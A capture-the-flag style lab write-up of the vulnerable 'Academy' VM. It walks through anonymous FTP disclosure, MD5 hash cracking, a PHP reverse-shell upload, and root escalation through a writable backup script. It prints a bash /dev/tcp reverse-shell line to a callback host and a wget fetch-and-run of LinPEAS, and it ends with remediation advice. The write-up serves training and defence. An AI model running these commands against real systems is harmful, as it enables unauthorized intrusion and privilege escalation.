LAB WRITEUP · LINUX

Academy

I investigated how exposed application data, a PHP upload and a privileged scheduled task connected across Academy’s trust boundaries.

Target environment

  • Target: Academy
  • Operating system: Debian GNU/Linux; captured kernel 4.19.0-16-amd64
  • Architecture: x86_64 (64-bit)
  • Service / application: FTP, SSH and an Academy PHP web application
  • Weakness investigated: Exposed credentials, executable upload and a writable backup script that runs as root
  • Scope: Intentionally vulnerable, isolated training VM

1. Enumerate services and retrieve the FTP note

The documented FTP service prompted a check for anonymous access: a reachable FTP port alone would not establish unauthorized disclosure. The reporting page records the Nmap command below but labels the service listing as expected output, not a captured scan result. The subsequent anonymous login and file transfer are the page's retained evidence for access to the note.

Address placeholders replace lab addresses throughout the text and commands. They are not literal shell arguments; substitute the appropriate isolated-lab values before use. Recorded ports and command syntax are otherwise preserved. Redaction does not turn representative or reconstructed commands into captured execution evidence.

sudo nmap -p- -sC -sV -T4 <TARGET_IP> -oN academy_nmap.txt

I logged into FTP anonymously, listed the directory and downloaded note.txt. The capture confirms successful anonymous access and transfer.

ftp <TARGET_IP>

bye
cat note.txt

2. Recover access to the student application

The downloaded note contained sensitive student/account information and a password hash, making credential recovery a relevant next check. The supplied account of the lab says hash-identifier suggested MD5; that suggestion narrowed the hypothesis but did not prove the algorithm. Hashcat's MD5 mode and a wordlist then recovered a candidate password, and the walkthrough records its subsequent use to access the student application. Robin reports recovery taking about one second in this lab; that is a result for this hash and setup, not a universal claim about MD5. The note/transfer evidence does not by itself demonstrate hash recovery or successful application authentication, and a safe captured Hashcat session is not included. The hash, candidate password and credential-bearing captures remain omitted.

hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 0 --show hashes.txt

I used FFUF to locate web directories. The notes identify /academy/ and its student profile image upload; these discovery results are documented in prose rather than reproduced as terminal evidence.

ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-u http://<TARGET_IP>/FUZZ -ac

3. Obtain a shell through the web service

I used the Academy PHP upload as the initial execution path. The notes describe uploading a PHP reverse shell as a profile photo and requesting the uploaded file. The retained terminal capture confirms a callback and www-data identity; it does not show the upload request itself.

nc -lvnp 1234
whoami

The reporting page later describes a listener on port 4444. I retain the captured port here rather than silently changing the original evidence.

python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

The shell stabilization commands are recorded in the reporting page; a matching capture was not retained.

4. Enumerate files and switch to the local user

I ran LinPEAS to investigate local privilege boundaries. The reporting page identifies /home/grimmie/backup.sh and the web application’s database configuration.

cd /tmp
wget http://<CALLBACK_IP>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

Application configuration exposed a database credential, making credential reuse against a local account a relevant check. The notes describe using that credential to log in as grimmie over SSH; later captures show that account's shell. This is a same-host account transition, not evidence of cross-host lateral movement. The configuration screenshot remains excluded because it exposes the password.

ssh grimmie@<TARGET_IP>
whoami
id
pwd

5. Trace and modify the privileged backup task

I investigated the backup script and used pspy64 to observe processes without root access. The capture shows UID=0 executing the script through Bash. The security issue was the trust boundary: a privileged task executed a script that my less privileged account could change.

ls -l /home/grimmie/backup.sh
cat /home/grimmie/backup.sh
./pspy64

I edited the script, started a second listener and checked the resulting shell. The final screenshot shows the script contents and root callback together. Its commands use port 8080; the reporting page’s later example uses 5555, so the captured version is preserved below.

nc -lvnp 8080
# In the grimmie session:
nano backup.sh
cat backup.sh

Captured modified script:

#!/bin/bash
bash -i >& /dev/tcp/<CALLBACK_IP>/8080 0>&1

6. Result and evidence limits

The retained callback shows whoami returning root. Alongside the process running as root capture and modified script, this supports the documented escalation through the scheduled backup task.

Evidence covers anonymous FTP, the web service identity, privileged script execution and the final root shell. The exact Nmap/FFUF result listings, upload HTTP exchange, Hashcat session and full LinPEAS run are not included as safe captured evidence. Expected output in the reporting page is not promoted to verified output. No remediation or retest was performed for this writeup.

  1. Anonymous FTP note
  2. Credential recovery

  7. Root

8. Findings and remediation

Attack / finding

Sensitive account information exposed through anonymous FTP

Anonymous access allowed retrieval of a sensitive student/account note used in the documented credential recovery path. The issue is access to sensitive content without authorization, not an open FTP port or anonymous service intended solely for public files.

Recommended defensive action

Remove sensitive files and backups from the anonymous-access area. Disable anonymous FTP if unnecessary; otherwise confine it to an explicitly public-only directory, with appropriate filesystem permissions and network restrictions. Reset exposed account credentials and review download and authentication logs. Replace legacy fast password hashing with a vetted password-hashing implementation such as Argon2id, using unique salts and a cost tuned for the deployment. Use encrypted file-transfer transport to protect data in transit; encryption alone does not correct anonymous authorization or exposed files.

Attack / finding

Executable profile upload

The documented PHP upload led to a captured www-data shell.

Recommended defensive action

Allowlist expected image formats, verify file contents, store uploads outside executable paths and prevent script execution in upload storage.

Attack / finding

Credential reuse

The notes describe moving from the web account to grimmie with a recovered configuration credential.

Recommended defensive action

Separate application/database and operating system credentials, restrict configuration access and rotate the exposed credential.

Attack / finding

Writable privileged script

Root executed a backup script modified by grimmie.

Recommended defensive action

Make privileged scripts and their parent directories writable only by the required privileged owner; run scheduled tasks with the least necessary privileges and verify the effective execution identity.
